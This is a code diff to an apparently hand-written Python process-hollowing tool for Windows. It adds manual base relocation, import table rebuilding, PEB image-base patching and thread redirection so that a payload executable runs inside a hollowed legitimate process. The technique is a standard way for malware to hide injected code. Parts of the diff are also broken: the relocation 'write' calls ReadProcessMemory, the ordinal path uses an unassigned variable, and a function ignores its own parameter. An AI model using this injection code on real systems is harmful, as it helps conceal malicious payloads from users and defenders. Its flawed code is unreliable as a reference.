+                # find Offset -> bitwise AND with 0x0fff to isolate bottom 12 bits
+                reloc_offset = entry & RELOC_OFFSET_MASK
+
+                # If Type 10 (IMAGE_REL_BASED_DIR64) -> patch address
+                if reloc_type == 10:
+                    patch_addr = int(lpBaseAddress) + page_rva + reloc_offset
+                    
+                    # read current value at pointer address
+                    orig_val = ctypes.c_uint64(0)
+                    kernel32.ReadProcessMemory(
+                        hProcess,
+                        ctypes.c_void_p(patch_addr),
+                        ctypes.byref(orig_val),
+                        ctypes.sizeof(orig_val),
+                        None)
+                        
+                    # apply delta -> write back
+                    fixed_val = ctypes.c_uint64(orig_val.value + delta)
+                    kernel32.ReadProcessMemory(
+                        hProcess,
+                        ctypes.c_void_p(patch_addr),
+                        ctypes.byref(fixed_val),
+                        ctypes.sizeof(orig_val),
+                        None)
+                        
+                    print(f"Patching at {hex(patch_addr)}: {hex(orig_val.value)} -> {hex(fixed_val.value)}")
+
+            # increment offset to next block
+            current_offset += size_block    
+
+    print(f"[!!!!!] Relocation Complete [!!!!!]")
+                
 # --------------- Execution ---------------
 
 
@@ -950,13 +1208,158 @@ def resume_orig_process(
 
 
 
+def rva_to_file_offset(f, rva):
+    """ Helper to convert RVA to raw file offset using the Section Table """
+    pe_offset = get_pe_header_offset(f)
+    sec_table = get_section_table_offset(f)
+    f.seek(get_file_header_offset(f) + 2) # NumberOfSections
+    num_sec = struct.unpack('<H', f.read(2))[0]
+    
+    for i in range(num_sec):
+        f.seek(sec_table + (i * 40) + 8) # Skip name
+        v_size, v_addr, r_size, r_ptr = struct.unpack('<IIII', f.read(16))
+        if v_addr <= rva < (v_addr + v_size):
+            return r_ptr + (rva - v_addr)
+    return 0
+
+
+"""
+Break this up, currently doing the following jobs:
+- parsing DLL list
+- loading dependencies
+- resolving individual functions
+
+
+
+"""
+def fix_iat_manual(hProcess, lpBaseAddress, payload_path):
+    print(f"\n[+] Fixing Import Address Table (IAT) Manually:")
+    
+    with open(payload_path, 'rb') as f:
+        # 1. Get offsets
+        pe_offset = get_pe_header_offset(f)
+        opt_hdr_offset = get_optional_header_offset(f)
+        
+        # 2. Get Import Directory Info (Index 1 of Data Directories)
+        import_dir_entry = opt_hdr_offset + OPT_HDR_DATA_DIRECTORIES + (DIR_IMPORT * DATA_DIRECTORY_SIZE)
+        f.seek(import_dir_entry)
+        import_va = struct.unpack('<I', f.read(4))[0]
+        import_size = struct.unpack('<I', f.read(4))[0]
+
+        if import_va == 0:
+            print("    -> No imports found.")
+            return
+
+        # 3. Find file offset for the Import Descriptor Array
+        # (Re-use your section-finding logic from the Relocation function)
+        import_file_ptr = rva_to_file_offset(f, import_va)
+        
+        # 4. Iterate through IMAGE_IMPORT_DESCRIPTORs (20 bytes each)
+        # Array ends with a null-filled descriptor
+        descriptor_idx = 0
+        while True:
+            f.seek(import_file_ptr + (descriptor_idx * 20))
+            # OriginalFirstThunk (0), Name (12), FirstThunk (16)
+            oft_va, timestamp, forwarder, name_va, ft_va = struct.unpack('<IIIII', f.read(20))
+            
+            if name_va == 0: break # Null descriptor marks the end
+            
+            # Get DLL name from file
+            f.seek(rva_to_file_offset(f, name_va))
+            dll_name = b""
+            while True:
+                char = f.read(1)
+                if char == b"\x00": break
+                dll_name += char
+            dll_str = dll_name.decode()
+            
+            # Load DLL in our process to get its base
+            dll_name = dll_name.split(b'\x00')[0]
+            h_dll = kernel32.LoadLibraryA(dll_name)
+            
+            # if it fails, try to see if its already in memory
+            if not h_dll:
+                h_dll = kernel32.GetModuleHandleA(dll_name)
+                
+            if not h_dll:
+                print(f"[!] CRITICAL [!]: Could not find/load {dll_name.decode()}")
+ 
+            
+            print(f"    -> Resolving imports for {dll_str}...")
+
+            # 5. Iterate through Thunks (Functions)
+            # Use OriginalFirstThunk (INT) to find names, patch into FirstThunk (IAT)
+            thunk_idx = 0
+            while True:
+                # Read 8 bytes for x64 thunk
+                f.seek(rva_to_file_offset(f, oft_va) + (thunk_idx * 8))
+                thunk_val = struct.unpack('<Q', f.read(8))[0]
+                
+                if thunk_val == 0: break # End of function list
+                
+                # Check if imported by Ordinal (high bit set)
+                if thunk_val & 0x8000000000000000:
+                    ordinal = thunk_val & 0xFFFF
+                    func_name = func_name.split(b'\x00')[0]
+                    func_addr = kernel32.GetProcAddress(h_dll, ctypes.c_void_p(ordinal))
+                else:
+                    # Imported by Name: Skip 2-byte 'Hint', read name string
+                    f.seek(rva_to_file_offset(f, thunk_val) + 2)
+                    func_name = b""
+                    while True:
+                        char = f.read(1)
+                        if char == b"\x00": break
+                        func_name += char
+                    func_addr = kernel32.GetProcAddress(h_dll, func_name)
+
+                if func_addr:
+                    print(f"[-] IAT {dll_str} -> {func_name.decode() if 'func_name' in locals() else 'Orginal' + str(ordinal)} @ {hex(func_addr)}")
+                else:
+                    print(f"[!!!!] FAILED to resolve: {dll_str} -> {func_name if 'func_name' in locals() else ordinal}") 
+
+
+                # 6. Write resolved address into Target Process IAT
+                # Target IAT Entry = lpBaseAddress + FirstThunk_VA + offset
+                iat_entry_va = lpBaseAddress + ft_va + (thunk_idx * 8)
+                kernel32.WriteProcessMemory(
+                    hProcess,
+                    ctypes.c_void_p(iat_entry_va), 
+                    ctypes.byref(ctypes.c_uint64(func_addr)), 
+                    8, 
+                    None)
+                
+                thunk_idx += 1
+            descriptor_idx += 1
+
+    print("    -> IAT Fix Complete.")
+
+
+
+
+def patch_peb(hProcess: wintypes.HANDLE, PROCESS_BASIC_INFORMATION, lpBaseAddress: int) -> None:
+    print(f"\n[+] Patching PEB to point to new ImageBase: WriteProcessMemory()")
+
+    peb_image_base_ptr = pbi.PebBaseAddress + 0x10
+    new_base_buffer = ctypes.c_uint64(int(lpBaseAddress))
+
+    if not kernel32.WriteProcessMemory(
+        hProcess,
+        ctypes.c_void_p(peb_image_base_ptr),
+        ctypes.byref(new_base_buffer),
+        ctypes.sizeof(new_base_buffer),
+        None
+    ):
+        print(f"[!] Failed to patch PEB: {winerr()}")
+    else:
+        print(f"    -> PEB Updated, now  points to: {hex(lpBaseAddress)}")
+
+
+
+
 
 ##########################################
 ##### Main functionality starts here #####
 ##########################################
-
-# show state of CPU registers and struct info
-debug_cpu_registers()
 
 # create target process <- return handle/Ids to thread/process
 hThread, hProcess, dwThreadId, dwProcessId = create_process()
@@ -969,7 +1372,7 @@ hdr = "\n >>>>    Phase: Gathering Process Information    <<<<\n"
 print_hdr(hdr)
 
 # return base address, of where target process is loaded
-img_base_addr = get_img_base_addr(hProcess)
+pbi, img_base_addr = get_img_base_addr(hProcess)
 
 
 
@@ -980,7 +1383,7 @@ print_hdr(hdr)
 
 # calculate various entry points - for payload (on disk, in memory)
 payload_oep_rva = get_oep_rva(payload)
-payload_entry_point_va = get_entry_point_va(img_base_addr, payload_oep_rva)
+
 
 
 
@@ -993,14 +1396,30 @@ print_hdr(hdr)
 hollow_process(hProcess, img_base_addr)
 
 # retrieve SizeOfImage for payload
-size_of_payload = get_size_of_payload(payload)
+with open(payload, 'rb') as f:
+    size_of_payload = get_size_of_image(f)
 
-# allocate memory at same hollowed-out base
-# - given wrapper, if we can't re-assign img_base_addr, a winerr() is raised
-lpBaseAddress = virtual_alloc_ex(hProcess, img_base_addr, size_of_payload)
 
-# write payload into allocated memory
+preferred_base = get_payload_preferred_base(payload)
+print(f"[!!] Preferred base: {hex(preferred_base)}")
+
+
+# allocate memory / write payload
+lpBaseAddress = virtual_alloc_ex(hProcess, preferred_base, size_of_payload)
 write_payload(hProcess, lpBaseAddress, payload)
+
+
+
+# ----- Apply fixes
+perform_manual_relocation(hProcess, lpBaseAddress, preferred_base, payload)
+patch_peb(hProcess, pbi, lpBaseAddress)
+
+
+
+fix_iat_manual(hProcess, lpBaseAddress, payload)
+
+
+
 
 
 
@@ -1009,16 +1428,10 @@ write_payload(hProcess, lpBaseAddress, payload)
 hdr = "\n >>>>    Phase: Execution Redirection    <<<<\n"
 print_hdr(hdr)
 
-redirect_to_payload(hThread, payload_entry_point_va)
 
+actual_entry_point = lpBaseAddress + payload_oep_rva
+redirect_to_payload(hThread, actual_entry_point)
 
-##### FIX IAT HERE #####
-#
-#with open(payload) as f:
-#    pe_data = f.read()
-#
-#print(f"\n[+] Fixing Import Address Table:")
-#fix_iat_for_hollowing(hProcess, lpBaseAddress, pe_data)
 
 
 
@@ -1028,7 +1441,7 @@ hdr = "\n >>>>    Phase: Execution    <<<<\n"
 print_hdr(hdr)
 
 # confirm execution of payload
-pause(warning=True)
+# pause(warning=True)
 
 # resume execution of original thread/process
 resume_orig_process(hThread, dwThreadId, dwProcessId)
